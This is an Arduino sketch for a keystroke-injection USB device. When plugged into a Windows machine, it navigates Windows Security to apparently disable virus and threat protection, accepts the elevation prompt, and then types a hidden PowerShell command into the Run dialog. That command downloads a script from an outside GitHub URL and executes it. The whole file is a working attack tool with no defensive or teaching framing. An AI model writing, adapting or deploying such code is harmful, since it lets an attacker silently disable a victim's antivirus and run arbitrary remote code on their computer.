#include "Keyboard.h"

void setup() {
  // put your setup code here, to run once:
  Keyboard.begin();
  delay(1000);

  turnOffAV();
  delay(200);
  downloadAndRunShell();
}

void loop() {}

void downloadAndRunShell()
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Boic69/Arduino/main/helper.ps1');");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  
}

void turnOffAV()
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("virus and threat protection");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(3000);
  
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(200);
  
  Keyboard.press(0x20);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('Y');
  Keyboard.releaseAll();

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4 );
  Keyboard.releaseAll();
}
